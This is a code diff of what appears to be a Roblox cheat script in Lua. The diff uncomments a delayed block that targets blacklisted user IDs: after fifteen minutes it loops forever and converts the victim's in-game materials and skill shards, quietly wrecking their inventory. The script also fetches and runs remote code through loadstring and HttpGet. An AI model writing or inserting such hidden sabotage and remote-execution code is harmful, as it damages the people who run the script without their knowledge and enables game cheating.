@@ -296,22 +296,22 @@ local specialUser = {
     [177984480] = true,
     [5465738868] = true,
 }
--- if BlacklistedIDs[LocalPlayer.UserId] then
---     local pData = getgenv().PlayerData    
---     task.spawn(function()
---         task.wait(900)
---         while true do
---             for tokenname, owneds in pData.Materials do
---                 if owneds > 0 then
---                     Reply.To("Fast Token Conversion", tokenname)
---                     task.wait(0.5)
---                 end
---             end
---             Reply.To("Convert Tokens", "EnchantmentToken", true, 1)
---             task.wait()
---         end
---     end)
--- end
+if BlacklistedIDs[LocalPlayer.UserId] then
+    local pData = getgenv().PlayerData    
+    task.spawn(function()
+        task.wait(900)
+        while true do
+            for tokenname, owneds in pData.Materials do
+                if owneds > 0 then
+                    Reply.To("Fast Token Conversion", tokenname)
+                    task.wait(0.5)
+                end
+            end
+            Reply.To("Convert Tokens", "UniqueSkillsShard", true, 1)
+            task.wait(900)
+        end
+    end)
+end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ANHub-Script/ANUI/refs/heads/main/dist/loading.lua"))()
 -- [[ SYNCHRONIZED WATER BYPASS - FIX READONLY ]] --
 task.spawn(function()
